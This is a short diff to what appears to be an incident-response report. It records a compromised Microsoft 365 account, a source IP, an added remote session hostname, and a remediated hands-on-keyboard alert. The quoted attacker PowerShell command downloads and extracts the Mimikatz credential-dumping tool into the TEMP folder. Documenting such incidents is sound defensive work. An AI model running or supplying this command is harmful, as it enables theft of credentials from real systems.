@@ -7,6 +7,7 @@
 * User Account : jenny@30dayproject[.]onmicrosoft[.]com
 * Melicious IP: 167.179.90.72
 * Melicious IP Country : Japan
+* Melicious Remote Session Host ENDDYGANNY
 * Executed PowerShell Command :  iwr "hxxps[://github[.com/gentilkiwi/mimikatz/releases/download/2[.]2[.]0-20220919/mimikatz_trunk[.]zip" -Outfile "$env:TEMP\mimikatz.zip"; Expand-Archive "$env:TEMP\mimikatz.zip" -DestinationPath "$env:TEMP\mimikatz_extracted" -Force
 - Alert: Hands-on keyboard attack launched from a compromised account
 - Investigation Status: Remediated
